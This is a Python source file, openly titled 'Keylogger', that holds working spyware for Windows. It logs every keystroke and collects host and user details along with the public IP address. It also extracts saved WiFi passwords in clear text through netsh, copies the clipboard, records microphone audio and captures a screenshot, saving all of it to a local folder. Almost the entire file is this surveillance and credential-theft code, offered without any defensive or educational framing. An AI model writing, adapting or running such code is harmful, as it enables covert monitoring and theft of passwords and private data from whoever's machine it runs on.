"""
Keylogger
========================================================================

Copyright (c) 2026 [Soumit Santra]
All rights reserved.

===================================================================
Author: [Soumit Santra]
Version: 1.0
Created: 2025
Last Modified: 2025
"""

import sys
import subprocess
import os

def install_dependencies():
    # Install required packages
    try:
        # First ensure pip and setuptools are available
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip', 'setuptools'])
        
        # Install required packages directly
        packages = [
            "setuptools",
            "pynput",
            "requests",
            "pywin32",
            "sounddevice",
            "scipy",
            "Pillow"
        ]
        
        for package in packages:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        return True
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        return False

# Install dependencies before importing them
if install_dependencies():
    from pynput.keyboard import Listener, Key  # type: ignore
    from requests import get  # type: ignore
    import sounddevice as sd  # type: ignore
    from scipy.io.wavfile import write  # type: ignore
    from threading import Thread
    from PIL import ImageGrab  # type: ignore
else:
    print("Failed to install required dependencies. Please install manually.")
    sys.exit(1)

from datetime import datetime
import time
import socket
import platform
import win32clipboard # type: ignore
from threading import Timer

# Create information directory
def create_info_directory():
    info_dir = "information"
    if not os.path.exists(info_dir):
        os.makedirs(info_dir)
    return info_dir

info_dir = create_info_directory()

# Buffer to keep track of the typed characters
buffer = ""
last_keystroke = time.time()

# Function to insert current date and time into the log
def insert_date_header():
    current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    header = f"[=== Log Start: {current_time} ===]\n"
    with open(os.path.join(info_dir, "key_log.txt"), 'a') as f:
        f.write(header)
        
    # To get the system information and save it to a file
    def computer_information():
        with open(os.path.join(info_dir, "system_info.txt"), "w") as f:
            f.write("System Information:-\n")
            f.write("-"*50 + "\n")
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get('https://api.ipify.org').text
                f.write("Public IP Address: " + public_ip + "\n")
            except Exception:
                f.write("Unable to get Public IP Address\n")
            f.write("Private IP Address: " + IPAddr + "\n")
            f.write("Processor: " + platform.processor() + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("="*90 + "\n")  # Add separator line
            f.write("\n")
            f.write("User Information:-\n")
            f.write("-"*50 + "\n")
            f.write("User name: " + os.getlogin() + "\n")
            f.write("User id: " + str(os.getpid()) + "\n")
            f.write("User home: " + os.path.expanduser("~") + "\n")
            f.write("User password: ")
    # Get system info before starting the keylogger
    computer_information()
# Call it once at the beginning
insert_date_header()

def get_wifi_passwords():
    # Extract saved WiFi passwords and save them to wifi_pass.txt
    try:
        # Get all WiFi profiles
        networks = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
        network_names = [line.split(':')[1].strip() for line in networks.split('\n') 
                        if "All User Profile" in line]
        
        with open(os.path.join(info_dir, "wifi_pass.txt"), "w", encoding='utf-8') as f:
            f.write("Saved WiFi Networks and Passwords\n")
            f.write("-" * 50 + "\n")
            
            for network in network_names:
                try:
                    # Get password for each network
                    network_info = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', network, 'key=clear'],
                        encoding='utf-8'
                    )
                    password_line = [line.split(':')[1].strip() for line in network_info.split('\n') 
                                   if "Key Content" in line]
                    
                    if password_line:
                        f.write(f"Network: {network}\n")
                        f.write(f"Password: {password_line[0]}\n")
                    else:
                        f.write(f"Network: {network}\n")
                        f.write("Password: Not Found\n")
                    f.write("-" * 30 + "\n")
                except subprocess.CalledProcessError:
                    continue
    except Exception as e:
        with open(os.path.join(info_dir, "wifi_pass.txt"), "w") as f:
            f.write(f"Error extracting WiFi passwords: {str(e)}")

# Add this line after create_info_directory() is called
get_wifi_passwords()

# Clipboard function to copy the clipboard data
def copy_clipboard():
    with open(os.path.join(info_dir, "clipboard.txt"), "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data + "\n")
        except:
            f.write("Clipboard: Unable to get clipboard data\n")
        # Schedule next clipboard check in 60 seconds
        # Timer(60.0, copy_clipboard).start()
# Start the clipboard monitoring before the keylogger
copy_clipboard()

# audio recording function
def record_audio():
    # Create audio directory if it doesn't exist
    audio_dir = os.path.join(info_dir, "audio")
    if not os.path.exists(audio_dir):
        os.makedirs(audio_dir)
    # Record audio
    fs = 44100  # Sample rate
    seconds = 10  # Duration of recording
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    timestamp = datetime.now().strftime("Date- %d_%m_%Y Time- %H_%M_%S")
    audio_file = os.path.join(audio_dir, f'audio_{timestamp}.wav')
    write(audio_file, fs, myrecording)  # Save with timestamp in audio folder
    # Schedule next audio check in 60 seconds
    # Timer(60.0, record_audio).start()

# Screenshot function
def take_screenshot():
    # Create screenshots directory if it doesn't exist
    screenshots_dir = os.path.join(info_dir, "screenshots")
    if not os.path.exists(screenshots_dir):
        os.makedirs(screenshots_dir)
    # Take screenshot
    screenshot = ImageGrab.grab()
    timestamp = datetime.now().strftime("Date- %d_%m_%Y Time- %H_%M_%S")
    screenshot_path = os.path.join(screenshots_dir, f"screenshot_{timestamp}.png")
    screenshot.save(screenshot_path)  # Save with timestamp in screenshots folder
    # Schedule next screenshot check in 60 seconds
    # Timer(60.0, take_screenshot).start()

# Start audio recording in a separate thread
audio_thread = Thread(target=record_audio)
audio_thread.start()

# Start screenshot capture in a separate thread
screenshot_thread = Thread(target=take_screenshot)
screenshot_thread.start()

def write_to_file(key):
    global buffer, last_keystroke

    current_time = time.time()

    # If more than 10 second have passed since the last key press, insert a new date header
    if current_time - last_keystroke > 10:
        buffer += "\n"
        with open(os.path.join(info_dir, "key_log.txt"), 'a') as f:
            f.write("\n")
        insert_date_header()

    last_keystroke = current_time

    if hasattr(key, 'char') and key.char is not None:
        keydata = key.char
        buffer += keydata
    else:
        keydata = str(key)
        if key == Key.space:
            keydata = " "
            buffer += keydata
        if key == Key.shift_l:
            keydata = "[LEFT SHIFT]"
        if key == Key.shift_r:
            keydata = "[RIGHT SHIFT]"
        if key == Key.enter:
            keydata = "[ENTER]\n"
            buffer += "\n"
        if key == Key.esc:
            keydata = "[ESC]"
        if key == Key.tab:
            keydata = "[TAB]"
        if key == Key.caps_lock:
            keydata = "[CAPSLOCK]"
        if key == Key.ctrl_l:
            keydata = "[CTRL LEFT]"
        if key == Key.ctrl_r:
            keydata = "[CTRL RIGHT]"
        if key == Key.alt_l:
            keydata = "[ALT LEFT]"
        if key == Key.alt_r:
            keydata = "[ALT RIGHT]"
        if key == Key.cmd:
            keydata = "[CMD]"
        # scrolling keys
        if key == Key.scroll_lock:
            keydata = "[SCROLL LOCK]"
        if key == Key.print_screen:
            keydata = "[PRINT SCREEN]"
        if key == Key.delete:
            keydata = "[DELETE]"
        if key == Key.home:
            keydata = "[HOME]"
        if key == Key.end:
            keydata = "[END]"
        if key == Key.insert:
            keydata = "[INSERT]"
        if key == Key.page_up:
            keydata = "[PAGE UP]"
        if key == Key.page_down:
            keydata = "[PAGE DOWN]"
        # Arrow keys 
        if key == Key.up:
            keydata = "[UP]"
        if key == Key.down:
            keydata = "[DOWN]"
        if key == Key.left:
            keydata = "[LEFT]"
        if key == Key.right:
            keydata = "[RIGHT]"
        # Function keys 
        if key == Key.f1:
            keydata = "[F1]"
        if key == Key.f2:
            keydata = "[F2]"
        if key == Key.f3:
            keydata = "[F3]"
        if key == Key.f4:
            keydata = "[F4]"
        if key == Key.f5:
            keydata = "[F5]"
        if key == Key.f6:
            keydata = "[F6]"
        if key == Key.f7:
            keydata = "[F7]"
        if key == Key.f8:
            keydata = "[F8]"
        if key == Key.f9:
            keydata = "[F9]"
        if key == Key.f10:
            keydata = "[F10]"
        if key == Key.f11:
            keydata = "[F11]"
        if key == Key.f12:
            keydata = "[F12]"
        # Num keys 
        if key == Key.num_lock:
            keydata = "[NUM LOCK]"
        # Backspace key 
        if key == Key.backspace:
            if buffer:
                removed_char = buffer[-1]
                buffer = buffer[:-1]
                keydata = f"[BACKSPACE: {removed_char}]"
                with open(os.path.join(info_dir, "key_log.txt"), 'r+') as f:
                    content = f.read()
                    if content:
                        content = content[:-1]
                        f.seek(0)
                        f.write(content)
                        f.truncate()
            else:
                keydata = " "

    with open(os.path.join(info_dir, "key_log.txt"), 'a') as f:
        f.write(keydata)
        f.flush()

    
# Start the listener
with Listener(on_press=write_to_file) as listener:
    listener.join()




